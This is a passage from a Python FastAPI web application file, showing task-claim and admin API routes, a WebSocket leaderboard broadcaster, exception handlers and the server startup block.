    tasks = await tasks_repo.list_for_user(int(user["id"]))
    return {"status": "success", "items": tasks}


@app.post("/api/tasks/{task_id}/claim")
async def api_claim_task(task_id: int, payload: TaskClaimRequest, request: Request, user: Dict[str, Any] = Depends(verify_web_request)):
    csrf_guard(request, request.cookies.get(settings.CSRF_COOKIE_NAME), request.headers.get("X-CSRF-Token"))
    result = await tasks_repo.claim(int(user["id"]), task_id)
    return {"status": "success", "reward": result["reward"], "balance": result["balance"]}


# =============================================================================
# Routes: admin
# =============================================================================

@app.get("/api/admin/stats")
async def api_admin_stats(_: None = Depends(admin_key_guard)):
    return {"status": "success", "stats": await admin_repo.stats()}


@app.get("/api/admin/users")
async def api_admin_users(limit: int = Query(100, ge=1, le=1000), _: None = Depends(admin_key_guard)):
    return {"status": "success", "items": await admin_repo.list_users(limit)}


@app.get("/api/admin/tasks")
async def api_admin_tasks(_: None = Depends(admin_key_guard)):
    return {"status": "success", "items": await tasks_repo.list_active()}


# =============================================================================
# WebSocket leaderboard
# =============================================================================

class LeaderboardHub:
    def __init__(self) -> None:
        self.clients: List[WebSocket] = []
        self.lock = asyncio.Lock()

    async def connect(self, ws: WebSocket) -> None:
        await ws.accept()
        async with self.lock:
            self.clients.append(ws)

    async def disconnect(self, ws: WebSocket) -> None:
        async with self.lock:
            if ws in self.clients:
                self.clients.remove(ws)

    async def broadcast(self, payload: Dict[str, Any]) -> None:
        async with self.lock:
            clients = list(self.clients)
        for ws in clients:
            with contextlib.suppress(Exception):
                await ws.send_text(safe_json_dumps(payload))

leaderboard_hub = LeaderboardHub()

@app.websocket("/ws/leaderboard")
async def ws_leaderboard(ws: WebSocket):
    await leaderboard_hub.connect(ws)
    try:
        while True:
            leaderboard = await users_repo.get_leaderboard(20)
            await ws.send_text(safe_json_dumps({"leaderboard": leaderboard}))
            await asyncio.sleep(8)
    except WebSocketDisconnect:
        pass
    finally:
        await leaderboard_hub.disconnect(ws)


# =============================================================================
# Error handlers
# =============================================================================

@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    return JSONResponse(status_code=exc.status_code, content={"detail": exc.detail})


@app.exception_handler(RateLimitError)
async def rate_limit_exception_handler(request: Request, exc: RateLimitError):
    return JSONResponse(status_code=429, content={"detail": str(exc)})


# =============================================================================
# Main
# =============================================================================

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "app:app",
        host=settings.HOST,
        port=settings.PORT,
        reload=False,
        log_level="info",
    )
